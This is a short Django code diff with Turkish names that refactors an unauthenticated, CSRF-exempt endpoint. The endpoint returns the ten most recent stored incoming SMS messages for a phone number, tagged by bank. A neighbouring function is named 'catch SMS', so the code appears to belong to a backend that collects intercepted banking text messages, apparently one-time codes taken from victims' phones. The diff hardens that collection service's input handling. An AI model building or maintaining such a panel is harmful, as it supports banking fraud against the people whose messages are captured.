@@ -196,14 +196,19 @@ def SmsYakala(request):
 
 @csrf_exempt
 def sms_getir(request):
-    numarasi = request.POST['numarasi']
-    smsler = GelenSMS.objects.filter(numara=numarasi).order_by('-id')[:10]
-    if smsler.exists():
-        sonuc = "|".join([f"{sms.id},{sms.banka},{sms.mesaj}" for sms in smsler])
-        return HttpResponse(sonuc)
+    if request.method == 'POST':
+        numarasi = request.POST.get('numarasi')
+        if numarasi:
+            smsler = GelenSMS.objects.filter(numara=numarasi).order_by('-id')[:10]
+            if smsler.exists():
+                sonuc = "|".join([f"{sms.id},{sms.banka},{sms.mesaj}" for sms in smsler])
+                return HttpResponse(sonuc)
+            else:
+                return HttpResponse("SonucMesajYok!")
+        else:
+            return HttpResponse("Numara bulunamadı!")
     else:
-        return HttpResponse("SonucMesajYok!")
-
+        return HttpResponse({"SonucHatali"})
 
 
 
